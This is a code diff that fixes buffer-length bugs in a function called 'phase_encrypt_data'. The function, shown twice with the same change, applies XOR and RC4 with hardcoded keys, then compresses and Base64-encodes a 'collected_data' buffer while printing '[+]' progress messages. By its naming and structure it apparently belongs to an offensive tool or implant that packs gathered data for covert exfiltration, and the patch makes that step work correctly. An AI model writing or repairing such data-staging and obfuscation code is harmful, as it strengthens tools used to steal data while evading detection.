@@ -265,19 +265,22 @@ fn phase_encrypt_data() -> bool {
 
     if strlen(collected_data) > 0 {
         // XOR
-        jocky_decrypt_xor(collected_data, strlen(collected_data), 0x42, 1)
+        let raw_len = strlen(collected_data)
+
+        // XOR and RC4 with captured length — avoids strlen on binary data after encryption
+        jocky_decrypt_xor(collected_data, raw_len, 0x42, 1)
         println("    [+] XOR encryption applied")
 
-        // RC4
-        jocky_decrypt_rc4(collected_data, strlen(collected_data), "key123", 6)
+        jocky_decrypt_rc4(collected_data, raw_len, "key123", 6)
         println("    [+] RC4 encryption applied")
 
-        // Compression
-        let compressed = jocky_compress_data(collected_data, strlen(collected_data))
-        println("    [+] Data compressed")
+        // Compress with captured length (pre-encryption length is correct)
+        let compressed = jocky_compress_data(collected_data, raw_len)
+        let comp_size = jocky_compress_get_size()
+        println("    [+] Data compressed: " + string(comp_size) + " bytes")
 
-        // Base64 Encoding
-        let encoded = jocky_data_base64_encode(compressed, strlen(compressed))
+        // Base64 with actual compressed size — not strlen (compressed is binary)
+        let encoded = jocky_data_base64_encode(compressed, comp_size)
         collected_data = encoded
         println("    [+] Base64 encoded: " + string(strlen(collected_data)) + " bytes")
     }
@@ -822,19 +825,22 @@ fn phase_encrypt_data() -> bool {
 
     if strlen(collected_data) > 0 {
         // XOR
-        jocky_decrypt_xor(collected_data, strlen(collected_data), 0x42, 1)
+        let raw_len = strlen(collected_data)
+
+        // XOR and RC4 with captured length — avoids strlen on binary data after encryption
+        jocky_decrypt_xor(collected_data, raw_len, 0x42, 1)
         println("    [+] XOR encryption applied")
 
-        // RC4
-        jocky_decrypt_rc4(collected_data, strlen(collected_data), "key123", 6)
+        jocky_decrypt_rc4(collected_data, raw_len, "key123", 6)
         println("    [+] RC4 encryption applied")
 
-        // Compression
-        let compressed = jocky_compress_data(collected_data, strlen(collected_data))
-        println("    [+] Data compressed")
+        // Compress with captured length (pre-encryption length is correct)
+        let compressed = jocky_compress_data(collected_data, raw_len)
+        let comp_size = jocky_compress_get_size()
+        println("    [+] Data compressed: " + string(comp_size) + " bytes")
 
-        // Base64 Encoding
-        let encoded = jocky_data_base64_encode(compressed, strlen(compressed))
+        // Base64 with actual compressed size — not strlen (compressed is binary)
+        let encoded = jocky_data_base64_encode(compressed, comp_size)
         collected_data = encoded
         println("    [+] Base64 encoded: " + string(strlen(collected_data)) + " bytes")
     }
